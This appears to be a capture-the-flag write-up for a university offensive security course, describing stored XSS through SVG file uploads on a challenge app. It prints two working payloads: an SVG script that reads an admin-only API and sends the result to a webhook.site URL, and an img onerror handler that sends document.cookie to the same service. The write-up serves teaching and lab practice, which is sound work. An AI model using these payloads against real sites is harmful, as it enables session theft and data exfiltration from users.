# PicShare

**Category:** web / stored XSS via SVG upload · **Course:** Offensive Security (PoliTo)

## Vulnerability

The app accepts SVG file uploads and serves them back inline (rather than as a forced download or a sanitised/rasterised image). SVG is an XML format that permits embedded `<script>` elements and standard HTML event-handler attributes — an "image" upload that is really executable markup.

## Exploitation

Two payload variants captured, both delivered as the uploaded "avatar"/image:

`img.svg` — an embedded `<script>` tag that fetches an internal, authenticated-only endpoint and exfiltrates the response:

```xml
<script><![CDATA[
  fetch('/admin/api/flag').then(r => r.text()).then(flag => {
    fetch('https://webhook.site/...?flag=' + encodeURIComponent(flag));
  });
]]></script>
```

`img2.svg` — a simpler `onerror`-based cookie-stealer, for contexts where inline `<script>` tags get stripped but element attributes don't:

```html
<img src='x' onerror='fetch("https://webhook.site/...?c="+document.cookie)'>
```

## Files

- `img.svg` — stored-XSS payload that calls an internal admin API and exfiltrates its response
- `img2.svg` — stored-XSS payload that exfiltrates `document.cookie` via an `onerror` handler

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
